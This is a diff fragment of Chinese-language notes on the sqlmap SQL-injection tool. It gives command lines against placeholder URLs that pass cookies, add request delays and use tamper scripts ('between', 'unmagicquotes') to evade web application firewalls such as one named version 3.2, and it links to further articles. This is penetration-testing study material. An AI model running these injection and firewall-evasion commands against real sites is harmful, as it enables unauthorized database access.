@@ -133,21 +133,19 @@ sqlmap -u "URL/xxx.php" --cookie "id=n" --level 2 --dbms=mysql --dbs   #cookies�
 
 tamper（编写绕过规则）：进行绕过waf（防护规则，检测发包间隔）
 
-sqlmap默认tamper有  
+sqlmap -u "http://URL/id=1" --tamper "xx.py"  
 
-sqlmap -u "http://URL/id=1" --tamper "xx.py"  --delay 3 #每次发包延迟3秒再发
+详细：默认tamper
 
- -v 显示包的等级
-
-暂时能过V3.2，更高版本的安全狗要研究
-
-详细：http://www.91ri.org/7852.html
-
-空格 换成 #、随即字符串、换行符
+```
+http://www.91ri.org/7852.html
+https://blog.csdn.net/admin18310911366/article/details/114061907
+```
 
 例子：
 
 ```
---tamper between    # 绕过>过滤
+--tamper=between       # 绕过>过滤
+--tamper=unmagicquotes # 宽字节注入
 ```
 
